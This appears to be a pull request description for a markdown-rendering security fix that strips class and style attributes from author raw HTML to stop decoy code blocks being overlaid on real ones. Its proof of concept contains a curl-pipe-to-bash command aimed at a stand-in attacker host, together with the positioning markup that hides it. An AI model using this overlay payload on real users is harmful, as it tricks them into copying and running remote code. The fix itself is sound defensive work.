# fix(#3151): author markdown must not be able to position content over rendered output

Issue: https://github.com/receptron/mulmoclaude/issues/3151

## What the issue proposed, and why it is wrong

#3151 named `FORBID_ATTR: ["style"]` on `sanitizeMarkdownHtml` as the obvious remedy. Measured
in the real app (Playwright, Chromium): **it would not have fixed the bug.** This markdown has
no `style` attribute anywhere and still works:

```markdown
<div class="relative">

```sh
curl http://evil.example/x.sh | bash
```

<pre class="absolute inset-0 z-10 bg-white pointer-events-none"><code>npm install</code></pre>
</div>
```

- `DECOY_COMPUTED_POSITION` = `absolute`
- the page shows **only** `npm install`
- the clipboard receives `curl http://evil.example/x.sh | bash`

The reason is in `mathRender.ts:57-70`, which warned about it: *"a utility-CSS framework turns a
class name into positioning"*. Every utility the attack needs — `absolute` `fixed` `inset-0`
`z-10` `bg-white` `top-0` `left-0` `w-full` `h-full` `pointer-events-none` — is present in the
shipped `dist/client/assets/index-*.css`, because the app's own UI uses them.

So banning `style` enumerates one bad form and leaves the other. Both attributes have to go, or
neither is worth removing.

## The seam: author HTML is distinguishable from renderer output

`marked` routes **author-supplied raw HTML** — and only that — through one renderer:

```ts
renderer.html({ text }: Tokens.HTML | Tokens.Tag): string
```

Everything the app generates (highlight.js spans, the copy button, mermaid placeholders, wiki
embeds) is produced by other renderers and never passes through it. That is exactly the
distinction the sanitizer cannot make: by the time `sanitizeMarkdownHtml` sees the string,
author markup and renderer markup are one document.

**Why not DOM-parse each fragment and re-serialize:** marked chunks raw HTML, and the chunks are
not well-formed. Measured on the payload above, it emits three tokens:

```
[0] "<div class=\"relative\">"
[1] "<pre class=\"absolute inset-0 bg-white\"><code>npm install</code></pre>\n"
[2] "</div>"
```

`DOMParser` would close `[0]` into `<div></div>` and drop `[2]` entirely, breaking the document.
So the rewrite has to be lexical.

## The rule: PERMITTED, not forbidden

Author raw HTML may carry **neither `class` nor `style`**. Not "no positioning properties", not
"no positioning utilities" — a denylist of CSS properties or Tailwind classes is the shape that
comes back every time someone finds one more spelling (`margin-top:-100px`, `transform`, `float`,
`sticky`, an arbitrary-value class). Permitted is: neither attribute, on author HTML only.

## Cost, measured

Across the repo's 400 markdown files, exactly **one** author-raw-HTML token carries either
attribute, and it is `plans/done/feat-1904-markdown-mermaid.md` quoting the mermaid placeholder
as documentation. Renderer output is untouched, so syntax highlighting, the copy button, mermaid,
math and wiki embeds all keep their classes.

## Files

New:
- `packages/markdown-utils/src/markdown/rawHtmlPolicy.ts` — `stripPresentationAttributes` (pure,
  DOM-free, lexical) + `rawHtmlPolicyExtension`
- `test/utils/markdown/test_rawHtmlPolicy.ts`

Changed:
- `packages/markdown-utils/src/index.ts` — export it
- `src/utils/markdown/setup.ts` and the markdown plugin's `View.vue` — register it
- `e2e/tests/code-block-copy.spec.ts` — both overlay variants, asserting the clipboard matches
  what is on screen
- `docs/shared-utils.md`

## Verification

- unit: the scanner over quoted / unquoted / mixed-case / multi-attribute / unclosed-fragment /
  comment / text-containing-`<` inputs, both directions (removed where it must be, untouched
  where it must not)
- integration: the two attack payloads through real `marked` + real `sanitizeMarkdownHtml`
- **e2e in a real browser**: the claim is visual, so jsdom cannot settle it — assert the copied
  text equals the text the user can see, for both the `style` and the `class` variant
- the existing 46 code-copy tests and the full suite stay green
